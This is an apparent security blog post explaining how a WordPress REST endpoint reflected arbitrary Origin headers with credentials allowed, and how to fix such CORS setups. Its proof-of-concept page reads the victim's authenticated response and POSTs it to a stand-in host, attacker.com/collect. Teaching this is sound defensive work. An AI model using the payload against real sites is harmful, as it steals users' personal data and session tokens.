<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CORS Misconfiguration — 0xb0rn3</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=JetBrains+Mono:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --black:      #000000;
            --bg:         #111010;
            --bg-card:    #181716;
            --bg-field:   #1e1c1b;
            --bg-raised:  #252220;
            --gray-2:     #504945;
            --gray-3:     #3c3836;
            --fg:         #ebdbb2;
            --fg-muted:   #a89984;
            --fg-dim:     #665c54;
            --white:      #ffffff;
            --yellow:     #fabd2f;
            --orange:     #fe8019;
            --aqua:       #8ec07c;
            --red:        #fb4934;
            --blue:       #83a598;
            --purple:     #d3869b;
            --border:     rgba(235,219,178,.13);
            --border-mid: rgba(235,219,178,.28);
            --border-hi:  rgba(235,219,178,.6);
            --r-xs:  8px;
            --r-sm:  14px;
            --r:     20px;
            --r-lg:  28px;
            --r-pill:999px;
            /* Blue post accent */
            --acc:        #83a598;
            --acc-dim:    rgba(131,165,152,.1);
            --acc-border: rgba(131,165,152,.3);
        }

        *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
        html { scroll-behavior: smooth; }

        body {
            font-family: 'JetBrains Mono', monospace;
            background: var(--black);
            color: var(--fg);
            line-height: 1.8;
            overflow-x: hidden;
            position: relative;
        }

        body::before {
            content: '';
            position: fixed; inset: 0; z-index: 0;
            pointer-events: none; opacity: .028;
            background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
            background-size: 200px;
        }
        body::after {
            content: '';
            position: fixed; inset: 0; z-index: 0; pointer-events: none;
            background-image: radial-gradient(circle, rgba(235,219,178,.045) 1px, transparent 1px);
            background-size: 32px 32px;
            animation: gridDrift 30s linear infinite;
        }
        @keyframes gridDrift { from { background-position:0 0; } to { background-position:32px 32px; } }

        .rainbow-bar {
            position: fixed; top:0; left:0; right:0; height:3px;
            background: linear-gradient(90deg,var(--yellow),var(--orange),var(--red),var(--aqua));
            z-index: 9999;
        }

        /* ── NAV ── */
        .nav {
            position: fixed; top:3px; left:0; right:0; z-index:1000;
            backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
            background: rgba(0,0,0,.88);
            border-bottom: 2px solid var(--border);
            transition: border-color .3s;
        }
        .nav.scrolled { border-bottom-color: var(--border-mid); }
        .nav-content {
            max-width: 1200px; margin: 0 auto;
            padding: .9rem 2rem;
            display: flex; align-items: center; justify-content: space-between;
        }
        .nav-logo {
            font-family: 'Orbitron', monospace;
            font-size: 1.1rem; font-weight: 900;
            color: var(--yellow); text-decoration: none;
            display: flex; align-items: center; gap: .6rem;
            letter-spacing: 2px; transition: color .2s;
        }
        .nav-logo:hover { color: var(--orange); }
        .nav-back {
            display: flex; align-items: center; gap: .6rem;
            font-size: clamp(.6rem,1.5vw,.7rem); font-weight: 700;
            color: var(--fg-muted); text-decoration: none;
            text-transform: uppercase; letter-spacing: 1.2px;
            padding: .4rem 1rem;
            border-radius: var(--r-pill);
            border: 1.5px solid var(--border-mid);
            background: var(--bg-card);
            box-shadow: 2px 2px 0 var(--gray-3);
            transition: all .22s ease;
        }
        .nav-back:hover {
            color: var(--blue);
            border-color: var(--acc-border);
            background: var(--acc-dim);
            transform: translate(-2px,-1px);
            box-shadow: 3px 3px 0 var(--gray-2);
        }

        /* ── PAGE ── */
        .page {
            position: relative; z-index: 10;
            max-width: 820px; margin: 0 auto;
            padding: clamp(5.5rem,11vh,8rem) clamp(1rem,4vw,2rem) clamp(3rem,7vh,5rem);
            animation: riseIn .9s cubic-bezier(.16,1,.3,1) .1s both;
        }
        @keyframes riseIn {
            from { opacity:0; transform:translateY(28px); }
            to   { opacity:1; transform:translateY(0); }
        }

        /* ── HEADER ── */
        .post-header { margin-bottom: clamp(2rem,5vh,3rem); }
        .post-meta-row {
            display: flex; align-items: center;
            flex-wrap: wrap; gap: .6rem;
            margin-bottom: 1.2rem;
        }
        .meta-pill {
            display: inline-flex; align-items: center; gap: 5px;
            padding: 3px 11px;
            border-radius: var(--r-pill);
            font-size: clamp(.5rem,1.3vw,.58rem); font-weight: 700;
            text-transform: uppercase; letter-spacing: 1px;
            border: 1.5px solid;
        }
        .pill-blue   { color:var(--blue);   border-color:rgba(131,165,152,.3); background:rgba(131,165,152,.08); }
        .pill-aqua   { color:var(--aqua);   border-color:rgba(142,192,124,.3); background:rgba(142,192,124,.08); }
        .pill-red    { color:var(--red);    border-color:rgba(251,73,52,.3);   background:rgba(251,73,52,.08); }
        .pill-dim    { color:var(--fg-dim); border-color:var(--border);        background:var(--bg-field); }

        .post-title {
            font-family: 'Orbitron', monospace;
            font-size: clamp(1.5rem,5vw,2.6rem);
            font-weight: 900; color: var(--white);
            line-height: 1.15; letter-spacing: .04em;
            text-shadow: 4px 4px 0 var(--gray-3), 8px 8px 0 rgba(0,0,0,.5);
            margin-bottom: 1.2rem;
        }
        .post-desc {
            font-size: clamp(.78rem,2vw,.9rem);
            color: var(--fg-muted); line-height: 1.75;
            padding-left: 1rem;
            border-left: 3px solid var(--blue);
        }
        .divider {
            height: 1px; margin: clamp(1.5rem,4vh,2.5rem) 0;
            background: linear-gradient(90deg,transparent,var(--border-mid),transparent);
        }

        /* ── PROSE ── */
        .prose { display: flex; flex-direction: column; gap: 0; }

        .prose h2 {
            font-family: 'Orbitron', monospace;
            font-size: clamp(1rem,2.8vw,1.3rem);
            font-weight: 700; color: var(--white);
            text-transform: uppercase; letter-spacing: 1.5px;
            margin-top: clamp(2rem,5vh,3rem); margin-bottom: .9rem;
            display: flex; align-items: center; gap: .65rem;
        }
        .prose h2::before {
            content: '';
            display: block; flex-shrink: 0;
            width: 3px; height: 1.1em;
            background: var(--blue); border-radius: 2px;
        }

        .prose p {
            font-size: clamp(.76rem,2vw,.88rem);
            color: var(--fg-muted); line-height: 1.85;
            margin-bottom: clamp(.9rem,2.5vh,1.3rem);
        }
        .prose strong { color: var(--fg); font-weight: 600; }

        .prose ul, .prose ol {
            margin: .4rem 0 clamp(.9rem,2.5vh,1.4rem) 0;
            padding-left: 0; list-style: none;
            display: flex; flex-direction: column; gap: .5rem;
        }
        .prose li {
            font-size: clamp(.74rem,1.9vw,.86rem);
            color: var(--fg-muted); line-height: 1.7;
            display: flex; align-items: flex-start; gap: .65rem;
            padding: .55rem .9rem;
            background: var(--bg-field);
            border: 1.5px solid var(--border);
            border-radius: var(--r-sm);
        }
        .prose ul li::before { content:'›'; color:var(--blue); font-weight:700; font-size:1rem; line-height:1.5; flex-shrink:0; }
        .prose ol { counter-reset: ol-c; }
        .prose ol li { counter-increment: ol-c; }
        .prose ol li::before { content:counter(ol-c, decimal-leading-zero); color:var(--blue); font-weight:700; font-size:.7rem; line-height:1.9; flex-shrink:0; letter-spacing:.5px; }
        .prose li strong { color: var(--fg); }
        .prose li code { font-size:.85em; }

        /* Inline code */
        .prose code {
            font-family: 'JetBrains Mono', monospace; font-size:.88em;
            color: var(--yellow);
            background: rgba(250,189,47,.08);
            border: 1px solid rgba(250,189,47,.22);
            border-radius: var(--r-xs);
            padding: 1px 7px;
        }

        /* ── TERMINAL COMMAND BLOCK ── */
        .cmd-block {
            background: var(--bg-field);
            border: 2px solid var(--border-mid);
            border-radius: var(--r);
            overflow: hidden;
            margin: clamp(.8rem,2.5vh,1.4rem) 0;
            box-shadow: 4px 4px 0 var(--gray-3);
        }
        .cmd-bar {
            display: flex; align-items: center; gap: 7px;
            padding: .6rem 1rem;
            background: var(--bg-raised);
            border-bottom: 1.5px solid var(--border);
        }
        .cmd-dot { width:8px; height:8px; border-radius:50%; flex-shrink:0; }
        .cmd-dot.r { background:#ff5f57; }
        .cmd-dot.y { background:#febc2e; }
        .cmd-dot.g { background:var(--aqua); }
        .cmd-bar-title { font-size:clamp(.52rem,1.3vw,.6rem); color:var(--fg-dim); letter-spacing:1.2px; text-transform:uppercase; flex:1; }
        .cmd-bar-lang {
            font-size: clamp(.5rem,1.2vw,.57rem); font-weight:700;
            color: var(--blue); letter-spacing:.8px;
            text-transform: uppercase;
        }
        .cmd-body {
            padding: clamp(.9rem,2vw,1.2rem) clamp(1rem,2.5vw,1.4rem);
            font-family: 'JetBrains Mono', monospace;
            font-size: clamp(.68rem,1.8vw,.8rem);
            color: var(--aqua); line-height: 1.7;
            overflow-x: auto;
        }
        .cmd-prompt { color:var(--yellow); font-weight:700; margin-right:.5rem; }

        /* Response headers block */
        .resp-block {
            background: var(--bg-field);
            border: 2px solid rgba(131,165,152,.25);
            border-radius: var(--r);
            overflow: hidden;
            margin: clamp(.8rem,2.5vh,1.4rem) 0;
            box-shadow: 4px 4px 0 var(--gray-3);
        }
        .resp-bar {
            display: flex; align-items: center; gap: 7px;
            padding: .55rem 1rem;
            background: rgba(131,165,152,.06);
            border-bottom: 1.5px solid rgba(131,165,152,.18);
            font-size: clamp(.52rem,1.3vw,.6rem);
            font-weight: 700; color: var(--blue);
            text-transform: uppercase; letter-spacing: 1.2px;
        }
        .resp-body {
            padding: clamp(.9rem,2vw,1.2rem) clamp(1rem,2.5vw,1.4rem);
            font-family: 'JetBrains Mono', monospace;
            font-size: clamp(.68rem,1.8vw,.8rem);
            line-height: 1.7; overflow-x: auto;
        }
        .resp-key   { color: var(--blue); }
        .resp-val   { color: var(--aqua); }
        .resp-bad   { color: var(--red); font-weight:600; }

        /* PoC code block */
        .poc-block {
            background: var(--bg-field);
            border: 2px solid rgba(251,73,52,.22);
            border-radius: var(--r);
            overflow: hidden;
            margin: clamp(.8rem,2.5vh,1.4rem) 0;
            box-shadow: 4px 4px 0 var(--gray-3);
        }
        .poc-bar {
            display: flex; align-items: center; gap: 7px;
            padding: .6rem 1rem;
            background: rgba(251,73,52,.06);
            border-bottom: 1.5px solid rgba(251,73,52,.18);
        }
        .poc-bar-title { font-size:clamp(.52rem,1.3vw,.6rem); color:var(--red); letter-spacing:1.2px; text-transform:uppercase; flex:1; font-weight:700; }
        .poc-bar-lang  { font-size:clamp(.5rem,1.2vw,.57rem); font-weight:700; color:var(--fg-dim); letter-spacing:.8px; text-transform:uppercase; }
        .poc-body {
            padding: clamp(.9rem,2vw,1.2rem) clamp(1rem,2.5vw,1.4rem);
            font-family: 'JetBrains Mono', monospace;
            font-size: clamp(.66rem,1.7vw,.78rem);
            line-height: 1.75; overflow-x: auto;
            color: var(--fg-muted);
        }
        /* Basic syntax tints */
        .t-tag     { color: var(--blue); }
        .t-attr    { color: var(--yellow); }
        .t-str     { color: var(--aqua); }
        .t-kw      { color: var(--purple); }
        .t-fn      { color: var(--yellow); }
        .t-cmt     { color: var(--fg-dim); font-style: italic; }
        .t-url     { color: var(--red); }
        .t-hi      { color: var(--orange); font-weight:600; }

        /* ── SCREENSHOT ── */
        .post-figure {
            margin: clamp(1rem,3vh,1.8rem) 0;
            background: var(--bg-card);
            border: 2px solid var(--border-mid);
            border-radius: var(--r-lg);
            overflow: hidden;
            box-shadow: 4px 4px 0 var(--gray-3);
        }
        .post-figure img { width:100%; display:block; object-fit:cover; }
        .post-figure figcaption {
            padding: .6rem 1rem;
            font-size: clamp(.55rem,1.4vw,.63rem);
            color: var(--fg-dim); letter-spacing:.8px;
            border-top: 1.5px solid var(--border);
            text-align: center;
        }

        /* ── CALLOUT ── */
        .callout {
            background: var(--bg-card);
            border: 2px solid var(--border-mid);
            border-radius: var(--r-lg);
            overflow: hidden;
            margin: clamp(1rem,3vh,2rem) 0;
            box-shadow: 4px 4px 0 var(--gray-3);
        }
        .callout-stripe { height:3px; background:linear-gradient(90deg,var(--blue),var(--aqua)); }
        .callout-inner { padding: clamp(1rem,3vw,1.5rem); }
        .callout-head {
            display: flex; align-items: center; gap:8px;
            font-family: 'Orbitron', monospace;
            font-size: clamp(.65rem,1.7vw,.76rem); font-weight:700;
            color: var(--white); text-transform:uppercase; letter-spacing:1.5px;
            margin-bottom: .75rem;
        }
        .callout-head i { color: var(--red); font-size:.8rem; }

        /* ── POST NAV ── */
        .post-nav {
            display: flex; align-items: center;
            justify-content: space-between; flex-wrap: wrap; gap:1rem;
            margin-top: clamp(2.5rem,6vh,4rem);
            padding-top: clamp(1.5rem,4vh,2.5rem);
            border-top: 2px solid var(--border);
        }
        .post-nav-btn {
            display: inline-flex; align-items: center; gap:.6rem;
            font-size: clamp(.62rem,1.6vw,.72rem); font-weight:700;
            color: var(--fg-muted); text-decoration: none;
            text-transform: uppercase; letter-spacing:1px;
            padding: .55rem 1.2rem;
            border-radius: var(--r-pill);
            border: 1.5px solid var(--border-mid);
            background: var(--bg-card);
            box-shadow: 3px 3px 0 var(--gray-3);
            transition: all .22s ease;
        }
        .post-nav-btn:hover {
            color: var(--blue);
            border-color: var(--acc-border);
            background: var(--acc-dim);
            transform: translate(-2px,-2px);
            box-shadow: 5px 5px 0 var(--gray-2);
        }

        ::-webkit-scrollbar { width:8px; }
        ::-webkit-scrollbar-track { background:var(--black); }
        ::-webkit-scrollbar-thumb { background:var(--gray-2); border-radius:var(--r-pill); }
        ::-webkit-scrollbar-thumb:hover { background:var(--blue); }

        @media (max-width: 600px) {
            .post-title { font-size:1.4rem; }
            .poc-body, .cmd-body, .resp-body { font-size:.65rem; }
        }
    </style>
</head>
<body>

    <div class="rainbow-bar" aria-hidden="true"></div>

    <nav class="nav" id="navbar">
        <div class="nav-content">
            <a href="../main.html" class="nav-logo"><i class="fas fa-terminal"></i>0xb0rn3</a>
            <div style="display:flex;gap:.5rem;align-items:center;">
                <a href="../main.html#about" class="nav-back" style="padding:.3rem .8rem;font-size:.62rem;"><i class="fas fa-home"></i></a>
                <a href="../blog.html" class="nav-back" style="padding:.3rem .8rem;font-size:.62rem;"><i class="fas fa-blog"></i></a>
                <a href="../CTF.html" class="nav-back" style="padding:.3rem .8rem;font-size:.62rem;"><i class="fas fa-trophy"></i></a>
                <a href="../blog.html" class="nav-back"><i class="fas fa-arrow-left"></i>Back to Blog</a>
            </div>
        </div>
    </nav>

    <main class="page">

        <header class="post-header">
            <div class="post-meta-row">
                <span class="meta-pill pill-dim"><i class="fas fa-calendar-alt"></i>August 2025</span>
                <span class="meta-pill pill-dim"><i class="fas fa-clock"></i>~5 min read</span>
                <span class="meta-pill pill-red"><i class="fas fa-exclamation-triangle"></i>Data Leak</span>
            </div>
            <h1 class="post-title">CORS Misconfiguration &amp; Data Exfiltration</h1>
            <p class="post-desc">
                Identifying and exploiting CORS misconfigurations for unauthorized data access —
                building proof-of-concept exploits and understanding the full security implications.
            </p>
            <div class="post-meta-row" style="margin-top:.9rem;">
                <span class="meta-pill pill-blue">Web Security</span>
                <span class="meta-pill pill-aqua">CORS</span>
                <span class="meta-pill pill-red">Data Leak</span>
            </div>
        </header>

        <div class="divider"></div>

        <div class="prose">

            <h2>Understanding CORS</h2>
            <p>
                Cross-Origin Resource Sharing (CORS) is a mechanism that allows browsers to make requests
                to domains other than the one serving the current page. By default, browsers enforce the
                <strong>same-origin policy</strong>, blocking cross-domain requests for security.
                CORS provides a way to selectively bypass this restriction.
            </p>
            <p>
                When implemented correctly, CORS enables legitimate cross-domain communication.
                When misconfigured, it becomes an <strong>information disclosure vulnerability</strong>.
            </p>

            <h2>Discovery Through Reconnaissance</h2>
            <p>
                During directory enumeration, I identified a <code>wp-json</code> endpoint that caught
                my attention. WordPress REST API endpoints are common, but their CORS configuration
                often reveals security issues.
            </p>

            <h2>Testing for Misconfiguration</h2>
            <p>
                Testing CORS is straightforward — add an <code>Origin</code> header to your request and
                inspect the server's response headers.
            </p>

            <ol>
                <li>Intercept the request in Burp Suite</li>
                <li>Add header: <code>Origin: https://attacker.com</code></li>
                <li>Send the request and examine the response headers</li>
            </ol>

            <p>
                A properly configured server will either reject the request or only allow specific,
                trusted origins. A misconfigured server will <strong>reflect the attacker-controlled
                origin back</strong> in the response.
            </p>

            <figure class="post-figure">
                <img src="../Images/cors.png" alt="CORS misconfiguration showing reflected origin in response headers">
                <figcaption>Burp Suite response — server reflects arbitrary Origin with credentials allowed.</figcaption>
            </figure>

            <p>The key indicator is in the response headers:</p>

            <div class="resp-block">
                <div class="resp-bar"><i class="fas fa-exchange-alt" style="font-size:.65rem;"></i>HTTP Response Headers — Misconfigured</div>
                <div class="resp-body">
<span class="resp-key">Access-Control-Allow-Origin:</span>     <span class="resp-bad">https://attacker.com</span>
<span class="resp-key">Access-Control-Allow-Credentials:</span> <span class="resp-bad">true</span>
<span class="resp-key">Access-Control-Allow-Methods:</span>     <span class="resp-val">GET, POST, PUT, DELETE</span>
<span class="resp-key">Access-Control-Allow-Headers:</span>     <span class="resp-val">Authorization, Content-Type</span>
                </div>
            </div>

            <p>
                When the server reflects the attacker's origin <em>and</em> includes
                <code>Access-Control-Allow-Credentials: true</code>, authenticated requests become
                possible from arbitrary origins. This breaks the security model browsers rely on
                to protect user data.
            </p>

            <h2>Exploitation</h2>
            <p>
                With CORS misconfigured, an attacker can craft a malicious page that makes authenticated
                requests to the vulnerable endpoint. When a victim visits the attacker's page while logged
                into the target site, their browser automatically includes authentication cookies.
            </p>

            <p>Proof-of-concept exploit:</p>

            <div class="poc-block">
                <div class="cmd-bar" style="background:rgba(251,73,52,.06);border-bottom:1.5px solid rgba(251,73,52,.18);">
                    <span class="cmd-dot r"></span>
                    <span class="cmd-dot y"></span>
                    <span class="cmd-dot g"></span>
                    <span class="poc-bar-title"><i class="fas fa-skull-crossbones" style="margin-right:5px;"></i>PoC — data exfiltration</span>
                    <span class="poc-bar-lang">HTML / JS</span>
                </div>
                <div class="poc-body"><span class="t-tag">&lt;!DOCTYPE html&gt;</span>
<span class="t-tag">&lt;html&gt;&lt;body&gt;</span>
<span class="t-tag">&lt;center&gt;</span>
  <span class="t-tag">&lt;h2&gt;</span>Data Exfiltration PoC<span class="t-tag">&lt;/h2&gt;</span>
  <span class="t-tag">&lt;button</span> <span class="t-attr">onclick</span>=<span class="t-str">'exploit()'</span><span class="t-tag">&gt;</span>Trigger<span class="t-tag">&lt;/button&gt;</span>
  <span class="t-tag">&lt;div</span> <span class="t-attr">id</span>=<span class="t-str">'output'</span><span class="t-tag">&gt;&lt;/div&gt;</span>

  <span class="t-tag">&lt;script&gt;</span>
  <span class="t-kw">function</span> <span class="t-fn">exploit</span>() {
    <span class="t-kw">var</span> xhr = <span class="t-kw">new</span> <span class="t-fn">XMLHttpRequest</span>();

    xhr.onreadystatechange = <span class="t-kw">function</span>() {
      <span class="t-kw">if</span> (<span class="t-kw">this</span>.readyState == <span class="t-str">4</span> &amp;&amp; <span class="t-kw">this</span>.status == <span class="t-str">200</span>) {
        <span class="t-kw">var</span> data = <span class="t-kw">this</span>.responseText;
        document.<span class="t-fn">getElementById</span>(<span class="t-str">"output"</span>).innerHTML = data;

        <span class="t-cmt">// Exfiltrate to attacker-controlled server</span>
        <span class="t-kw">var</span> exfil = <span class="t-kw">new</span> <span class="t-fn">XMLHttpRequest</span>();
        exfil.<span class="t-fn">open</span>(<span class="t-str">"POST"</span>, <span class="t-url">"https://attacker.com/collect"</span>, <span class="t-kw">true</span>);
        exfil.<span class="t-fn">send</span>(<span class="t-str">"data="</span> + <span class="t-fn">encodeURIComponent</span>(data));
      }
    };

    xhr.<span class="t-fn">open</span>(<span class="t-str">"GET"</span>, <span class="t-url">"https://target.com/wp-json/sensitive-endpoint"</span>, <span class="t-kw">true</span>);
    xhr.withCredentials = <span class="t-hi">true</span>; <span class="t-cmt">// Include victim's cookies</span>
    xhr.<span class="t-fn">send</span>();
  }
  <span class="t-tag">&lt;/script&gt;</span>
<span class="t-tag">&lt;/body&gt;&lt;/html&gt;</span></div>
            </div>

            <p>
                This page makes an authenticated request to the vulnerable endpoint, displays the response,
                and silently sends it to an attacker-controlled server. The victim sees a seemingly normal page.
                The attacker receives their sensitive data.
            </p>

            <h2>Impact</h2>

            <div class="callout">
                <div class="callout-stripe"></div>
                <div class="callout-inner">
                    <div class="callout-head"><i class="fas fa-radiation"></i>Attack Scenarios Enabled</div>
                    <ul>
                        <li><strong>Authentication token theft</strong> from API responses</li>
                        <li><strong>Personal information disclosure</strong> from user profile endpoints</li>
                        <li><strong>Cross-site request forgery</strong> with full response reading</li>
                        <li><strong>Session hijacking</strong> through reflected authentication data</li>
                    </ul>
                </div>
            </div>

            <h2>Proper Configuration</h2>
            <p>
                CORS should be configured with explicit allowlists of trusted origins. Never use:
            </p>
            <ul>
                <li>Wildcard origins with credentials enabled (<code>*</code> + <code>allow-credentials</code>)</li>
                <li>Reflection of arbitrary <code>Origin</code> headers</li>
                <li><code>null</code> origin acceptance</li>
                <li>Overly permissive method and header allowances</li>
            </ul>

            <p>
                The same-origin policy exists for a reason. CORS provides controlled exceptions to that policy.
                Misconfiguring it <strong>defeats the security model browsers rely on to protect users</strong>.
            </p>

        </div>

        <nav class="post-nav" aria-label="Post navigation">
            <a href="../blog.html" class="post-nav-btn">
                <i class="fas fa-arrow-left"></i>All Posts
            </a>
            <div style="display:flex;gap:.6rem;flex-wrap:wrap;">
                <span class="meta-pill pill-blue">Web Security</span>
                <span class="meta-pill pill-aqua">CORS</span>
                <span class="meta-pill pill-red">Data Leak</span>
            </div>
        </nav>

    </main>

    <script>
    'use strict';
    window.addEventListener('scroll', () => {
        document.getElementById('navbar').classList.toggle('scrolled', window.scrollY > 60);
    }, { passive: true });
    </script>
</body>
</html>
